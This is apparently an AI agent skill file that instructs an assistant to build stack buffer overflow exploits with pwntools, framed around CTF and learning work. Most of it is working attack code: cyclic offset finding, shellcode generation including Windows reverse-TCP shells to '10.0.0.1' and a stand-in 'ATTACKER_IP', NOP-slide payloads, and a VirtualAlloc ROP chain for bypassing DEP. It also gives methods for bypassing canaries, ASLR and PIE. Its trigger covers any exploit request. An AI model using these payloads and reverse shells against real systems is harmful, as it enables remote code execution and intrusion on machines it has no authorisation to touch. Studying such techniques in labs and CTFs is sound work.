---
name: stack-shellcode-exploit
description: Create stack shellcode exploits for binary exploitation challenges. Use this skill whenever the user mentions buffer overflow, stack overflow, shellcode, ret2shellcode, EIP/RIP overwrite, pwntools exploitation, or needs to write an exploit that executes arbitrary code via stack-based vulnerabilities. Also trigger for Windows x64 ROP chains with VirtualAlloc to bypass NX/DEP protections.
---

# Stack Shellcode Exploitation

This skill helps you create **stack shellcode exploits** for binary exploitation challenges. The technique involves writing shellcode to a vulnerable program's stack and overwriting the instruction pointer (EIP/RIP) to redirect execution to that shellcode.

## When to Use This Skill

- Buffer overflow challenges with stack-based vulnerabilities
- CTF pwn challenges requiring code execution
- Exploits needing to bypass NX/DEP via ROP chains
- Windows x64 exploitation with VirtualAlloc/VirtualProtect
- Any scenario where you need to execute arbitrary code via stack overflow

## Core Technique

### 1. Identify the Vulnerability

Look for unsafe functions like:
- `gets()` - no bounds checking
- `strcpy()` - no length limit
- `sprintf()` - no buffer size
- `scanf()` with `%s` - no width specifier

### 2. Compile with Protections Disabled

For testing/learning, compile vulnerable binaries with:

```bash
gcc -m32 -fno-stack-protector -z execstack -no-pie -o vulnerable vulnerable.c
```

**Flags explained:**
- `-fno-stack-protector`: Disables stack canaries
- `-z execstack`: Makes stack executable (required for shellcode)
- `-no-pie`: Disables PIE for predictable addresses
- `-m32`: 32-bit mode (simpler for learning)

### 3. Find the Offset to EIP/RIP

Use cyclic patterns to find where the buffer overflows into the return address:

```python
from pwn import *

# Generate cyclic pattern
pattern = cyclic(200)

# Send to vulnerable program
p = process('./vulnerable')
p.sendline(pattern)

# After crash, find offset from EIP value
offset = cyclic_find(0x6161616c)  # Replace with actual EIP value
print(f"Offset to EIP: {offset}")
```

### 4. Generate Shellcode

Use pwntools to generate appropriate shellcode:

```python
from pwn import *

# Linux shellcode for shell
shellcode = asm(shellcraft.sh())

# Windows reverse shell
shellcode = asm(shellcraft.amd64.windows.reverse_tcp("10.0.0.1", 4444))

# Custom shellcode
shellcode = asm(shellcraft.linux.x86.execve("/bin/sh"))
```

### 5. Build the Payload

```python
# NOP slide + shellcode + padding + return address
nop_slide = asm('nop') * 16
payload = nop_slide + shellcode
payload += b'A' * (offset - len(payload))  # Fill to EIP
payload += p32(0xffffcfb4)  # Address in NOP slide
```

## Protection Bypasses

### Stack Canaries
- **Disable**: `-fno-stack-protector`
- **Bypass**: Leak canary via format string, then include it in payload

### NX/DEP (Non-Executable Stack)
- **Disable**: `-z execstack`
- **Bypass**: Use ROP chain to call `mprotect()` (Linux) or `VirtualAlloc()` (Windows)

### ASLR (Address Space Layout Randomization)
- **Disable**: `setarch $(uname -m) -R ./vulnerable` or compile with `-no-pie`
- **Bypass**: Leak an address, calculate base, compute target addresses

### PIE (Position Independent Executable)
- **Disable**: `-no-pie`
- **Bypass**: Leak program base address, calculate offsets

## Windows x64: VirtualAlloc ROP Chain

On modern Windows, the stack is non-executable. Use ROP to call `VirtualAlloc` to make stack executable:

### Calling Convention (Win64)
```
VirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect)
- RCX = lpAddress (stack address)
- RDX = dwSize (e.g., 0x1000)
- R8  = MEM_COMMIT (0x1000)
- R9  = PAGE_EXECUTE_READWRITE (0x40)
```

### ROP Chain Structure

```python
from pwn import *

base = 0x7ff6693b0000  # Module base (leak or known)
IAT_VirtualAlloc = base + 0x400000  # Resolve from IAT

rop = b''

# R9 = 0x40 (PAGE_EXECUTE_READWRITE)
rop += p64(base + POP_R9_RET) + p64(0x40)

# R8 = 0x1000 (MEM_COMMIT) - use arithmetic if no POP R8
rop += p64(base + POP_R8_RET) + p64(0x1000)

# RCX = stack address (RSP)
rop += p64(base + LEA_RCX_RSP_RET)

# RDX = size
rop += p64(base + POP_RDX_RET) + p64(0x1000)

# Call VirtualAlloc
rop += p64(IAT_VirtualAlloc)

# Shellcode after chain
rop += asm(shellcraft.amd64.windows.reverse_tcp("ATTACKER_IP", PORT))
```

### Common Gadget Patterns

```python
# Set R9 from RSP-derived value
rop += p64(base + POP_RBX_RET) + p64(0x40)
rop += p64(base + MOV_R9_RBX_ZERO_R8_ADD_RSP_8_RET) + b'JUNKJUNK'

# Move RSP to RCX
rop += p64(base + POP_RBX_RET) + p64(0)
rop += p64(base + XOR_RBX_RSP_RET)
rop += p64(base + PUSH_RBX_POP_RAX_RET)
rop += p64(base + MOV_RCX_RAX_RET)

# Arithmetic for R8 if no POP R8
for _ in range(0x1000 // 0x40):
    rop += p64(base + ADD_R8_R9_ADD_RAX_R8_RET)
```

## Complete Exploit Template

Use the `create_stack_exploit.py` script (bundled with this skill) as a starting point. It provides:

1. Offset finding with cyclic patterns
2. Shellcode generation for common scenarios
3. Payload construction with NOP slides
4. Interactive mode for testing

## Debugging Tips

1. **GDB with pwndbg/gef**: Essential for seeing registers and memory
2. **Check for crashes**: Use `cyclic_find()` to verify offset
3. **Verify shellcode**: Test with `asm(shellcraft.sh())` first
4. **Address validation**: Ensure return address is in NOP slide
5. **Stack alignment**: Some functions require 16-byte alignment

## Common Pitfalls

- **Wrong architecture**: Ensure `-m32` for 32-bit or proper 64-bit handling
- **Bad characters**: Shellcode may contain null bytes or newlines that break the exploit
- **Address calculation**: Double-check offset and return address math
- **Protection flags**: Verify all protections are disabled or bypassed
- **Timing issues**: Some exploits need precise timing for race conditions

## References

- [pwntools documentation](https://docs.pwntools.com/)
- [Shellcraft examples](https://docs.pwntools.com/en/stable/shellcraft.html)
- [ROP gadget finding](https://github.com/JonathanSalwan/ROPgadget)
- [HackTricks binary exploitation](https://book.hacktricks.xyz/pentesting/pe-binary-exploitation)

## Next Steps

1. Run `create_stack_exploit.py` to generate a template
2. Adjust for your specific binary (offset, addresses, shellcode)
3. Test in GDB to verify the exploit works
4. Handle protections if they're enabled
5. For Windows, use the ROP chain pattern with VirtualAlloc
